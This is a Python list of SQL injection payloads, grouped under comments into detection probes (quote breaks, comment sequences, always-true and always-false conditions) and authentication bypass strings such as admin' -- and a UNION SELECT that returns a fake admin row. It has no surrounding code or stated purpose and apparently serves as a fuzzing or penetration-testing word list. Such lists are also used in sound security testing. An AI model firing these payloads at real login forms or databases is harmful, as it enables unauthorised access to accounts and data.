payloads = [
     # ============ 1. DETECTION / PROBING ============
        "'",               # Basic string break
        "\"",              # Double quote break
        "`",               # Backtick break
        "';",              # String + semicolon
        "\" --",           # Double quote + comment
        "' -- -",          # MySQL comment
        "' #",             # MySQL hash comment
        "'/*",             # Opening block comment
        "' AND 1=1 --",    # True condition
        "' AND 1=2 --",    # False condition
        "' OR 1=1 --",     # Always true
        "' OR 1=2 --",     # Always false
        "' OR '1'='1'",    # Always true (string)
        "' OR '1'='2",     # Always false (string)
        '" OR "" = "',     # MSSQL double-quote true
        '" OR 1 = 1 -- -', # Double-quote true + comment
        "' OR 'x'='x",     # Character equality true
        "'='",             # Short-circuit true
        "'LIKE'",          # LIKE operator probe
        "'=0--+",          # Numeric comparison
        "OR 1=1",          # Bare logical
        "' OR 1 -- -",     # Numeric true with comment
        "') OR 1=1 --",    # Closing paren + true
        "')) OR 1=1 --",   # Double closing paren
    

    # ============ 2. AUTH BYPASS ============
    
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "admin' OR 1=1--",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1 /*",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "') OR ('1'='1",
        "admin' -- -",
        "admin' OR 1=1 LIMIT 1 --",
        "' UNION SELECT 1, 'admin', 'pass' --",
        "') OR 1=1 --",
        "\" OR 1=1 --",
        "1' OR '1' = '1",
        "1' OR 1=1 --",
    ]